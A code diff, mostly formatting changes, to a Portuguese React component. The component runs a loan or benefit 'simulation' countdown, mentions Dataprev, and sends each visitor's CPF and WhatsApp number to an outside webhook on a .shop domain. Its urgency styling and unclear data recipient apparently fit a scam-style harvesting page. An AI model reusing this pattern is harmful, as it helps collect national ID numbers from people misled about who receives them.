@@ -35,19 +35,19 @@ const DataprevMessage = ({ cpf, pixType, pixKey, onSubmitSuccess }: DataprevMess
     if (cleanNumber.length < 10) return;
 
     setIsSubmitting(true);
-    
+
     try {
       await fetch("https://webhook.vpslegaleviver.shop/webhook/salvar_wpp", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json",
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({
           cpf,
-          whatsapp: cleanNumber,
-        }),
+          whatsapp: cleanNumber
+        })
       });
-      
+
       onSubmitSuccess();
     } catch (error) {
       console.error("Erro ao enviar telefone:", error);
@@ -94,8 +94,8 @@ const DataprevMessage = ({ cpf, pixType, pixKey, onSubmitSuccess }: DataprevMess
             onChange={(e) => setPhone(formatPhoneDataprev(e.target.value))}
             className="text-center text-lg h-14 font-semibold border-2 border-secondary/50 focus:border-secondary bg-secondary/5 text-popover-foreground caret-popover-foreground"
             maxLength={15}
-            autoFocus
-          />
+            autoFocus />
+          
           <p className="text-xs text-muted-foreground mt-2 text-center">
             Prometemos ser rápidos: é só pra te retornar sobre essa avaliação. Sem spam.
           </p>
@@ -106,13 +106,13 @@ const DataprevMessage = ({ cpf, pixType, pixKey, onSubmitSuccess }: DataprevMess
           variant="secondary"
           size="lg"
           className="w-full mt-4 gap-2 h-12 text-base font-semibold shadow-lg"
-          disabled={phone.replace(/\D/g, '').length < 10 || isSubmitting}
-        >
+          disabled={phone.replace(/\D/g, '').length < 10 || isSubmitting}>
+          
           {isSubmitting ? "Enviando..." : "Enviar"}
         </Button>
       </div>
-    </div>
-  );
+    </div>);
+
 };
 
 interface LoadingProposalsProps {
@@ -131,12 +131,12 @@ const formatPhone = (value: string) => {
   return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
 };
 
-export const LoadingProposals = ({ 
-  isTimedOut = false, 
-  cpf = "", 
-  pixType = "", 
+export const LoadingProposals = ({
+  isTimedOut = false,
+  cpf = "",
+  pixType = "",
   pixKey = "",
-  onWhatsAppSubmit 
+  onWhatsAppSubmit
 }: LoadingProposalsProps) => {
   const [countdown, setCountdown] = useState(10);
   const [countdownDone, setCountdownDone] = useState(false);
@@ -158,7 +158,7 @@ export const LoadingProposals = ({
       setCountdownDone(true);
       return;
     }
-    const timer = setTimeout(() => setCountdown(prev => prev - 1), 1000);
+    const timer = setTimeout(() => setCountdown((prev) => prev - 1), 1000);
     return () => clearTimeout(timer);
   }, [countdown, isTimedOut, isClosingPeriod, countdownDone]);
 
@@ -167,17 +167,17 @@ export const LoadingProposals = ({
     if (cleanNumber.length < 10) return;
 
     setIsSubmitting(true);
-    
+
     try {
       await fetch("https://webhook.vpslegaleviver.shop/webhook/salvar_wpp", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json",
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({
           cpf,
-          whatsapp: cleanNumber,
-        }),
+          whatsapp: cleanNumber
+        })
       });
     } catch (error) {
       console.error("Erro ao enviar WhatsApp:", error);
@@ -185,7 +185,7 @@ export const LoadingProposals = ({
 
     setIsSubmitting(false);
     setShowConfirmation(true);
-    
+
     if (onWhatsAppSubmit) {
       onWhatsAppSubmit(cleanNumber);
     }
@@ -222,17 +222,17 @@ export const LoadingProposals = ({
           </p>
         </div>
         
-          <Button 
-            variant="secondary" 
-            size="lg" 
+          <Button
+            variant="secondary"
+            size="lg"
             className="w-full mt-6"
-            onClick={handleConfirmationClose}
-          >
+            onClick={handleConfirmationClose}>
+            
             Entendido
           </Button>
         </div>
-      </div>
-    );
+      </div>);
+
   }
 
   // Tela de coleta de WhatsApp após timeout
@@ -274,30 +274,30 @@ export const LoadingProposals = ({
               value={whatsappNumber}
               onChange={(e) => setWhatsappNumber(formatPhone(e.target.value))}
               className="text-center text-base h-11"
-              maxLength={15}
-            />
+              maxLength={15} />
+            
           </div>
         
-          <Button 
-            size="lg" 
+          <Button
+            size="lg"
             className="w-full mt-4 gap-2 bg-success hover:bg-success/90 text-success-foreground animate-blink"
             onClick={handleWhatsAppSubmit}
-            disabled={whatsappNumber.replace(/\D/g, '').length < 10 || isSubmitting}
-          >
+            disabled={whatsappNumber.replace(/\D/g, '').length < 10 || isSubmitting}>
+            
             <MessageCircle className="w-4 h-4" />
             {isSubmitting ? "Salvando..." : "Salvar"}
           </Button>
         </div>
-      </div>
-    );
+      </div>);
+
   }
 
   // Renderização quando é período Dataprev - tela focada apenas no formulário
   if (isClosingPeriod) {
     return (
       <div className="w-full max-w-2xl mx-auto text-center animate-in fade-in duration-500">
-        {showDataprevConfirmation ? (
-          <div className="w-full max-w-md mx-auto p-4 md:p-6 bg-card border border-success/30 rounded-lg text-center">
+        {showDataprevConfirmation ?
+        <div className="w-full max-w-md mx-auto p-4 md:p-6 bg-card border border-success/30 rounded-lg text-center">
             <div className="relative inline-flex items-center justify-center w-12 h-12 mb-3">
               <div className="absolute inset-0 rounded-full bg-secondary/20 animate-pulse" />
               <div className="relative flex items-center justify-center w-12 h-12 rounded-full bg-gradient-to-br from-secondary/30 to-secondary/10">
@@ -308,17 +308,17 @@ export const LoadingProposals = ({
             <p className="text-muted-foreground text-xs md:text-sm leading-relaxed">
               A partir do dia 24 entraremos em contato pelo WhatsApp com as novidades dos valores liberados.
             </p>
-          </div>
-        ) : (
-          <DataprevMessage 
-            cpf={cpf} 
-            pixType={pixType} 
-            pixKey={pixKey} 
-            onSubmitSuccess={() => setShowDataprevConfirmation(true)} 
-          />
-        )}
-      </div>
-    );
+          </div> :
+
+        <DataprevMessage
+          cpf={cpf}
+          pixType={pixType}
+          pixKey={pixKey}
+          onSubmitSuccess={() => setShowDataprevConfirmation(true)} />
+
+        }
+      </div>);
+
   }
 
   // If countdown finished and not yet timed out externally, show WhatsApp form
@@ -334,8 +334,8 @@ export const LoadingProposals = ({
             </div>
           </div>
         
-          <h2 className="text-lg font-bold mb-3 text-foreground">
-            ⏳ Atualização da sua simulação
+          <h2 className="text-lg font-bold mb-3 text-foreground">Monitoramento em tempo
+real ativado
           </h2>
         
           <div className="text-muted-foreground text-sm mb-5 leading-relaxed space-y-3">
@@ -360,22 +360,22 @@ export const LoadingProposals = ({
               value={whatsappNumber}
               onChange={(e) => setWhatsappNumber(formatPhone(e.target.value))}
               className="text-center text-base h-11"
-              maxLength={15}
-            />
+              maxLength={15} />
+            
           </div>
         
-          <Button 
-            size="lg" 
+          <Button
+            size="lg"
             className="w-full mt-4 gap-2 bg-success hover:bg-success/90 text-success-foreground animate-blink"
             onClick={handleWhatsAppSubmit}
-            disabled={whatsappNumber.replace(/\D/g, '').length < 10 || isSubmitting}
-          >
+            disabled={whatsappNumber.replace(/\D/g, '').length < 10 || isSubmitting}>
+            
             <MessageCircle className="w-4 h-4" />
             {isSubmitting ? "Salvando..." : "Salvar"}
           </Button>
         </div>
-      </div>
-    );
+      </div>);
+
   }
 
   return (
@@ -404,6 +404,6 @@ export const LoadingProposals = ({
         <div className="text-4xl md:text-6xl font-bold text-secondary mb-2">{countdown}</div>
         <p className="text-sm md:text-base text-muted-foreground">Aguarde, estamos finalizando...</p>
       </div>
-    </div>
-  );
+    </div>);
+
 };
